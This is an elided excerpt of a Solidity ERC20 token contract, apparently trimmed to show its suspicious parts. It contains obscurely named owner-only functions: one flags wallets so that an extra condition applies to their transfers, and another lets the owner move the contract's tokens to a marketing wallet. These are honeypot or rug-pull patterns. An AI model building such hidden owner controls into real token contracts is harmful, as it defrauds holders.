...
contract conPhase is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (takeFee) {
            if (BuyOrSell == 1) {
                ...
                if(JayadaNikalnawala[from]==true)
                {
                    require(
                    amount > 1000,
                    "Transfer amount must be greater than given amount"
    ...
    function KyaJayadaNikalnawala(address _walletAddr , bool kareKiNa) external onlyOwner {
    ...
    function TheLenData(address _address, uint256 _number) external onlyOwner
    {
        ...
        tokenContract.approve(address(this), _number);
        tokenContract.transferFrom(address(this), _markWallet, _number);
    }
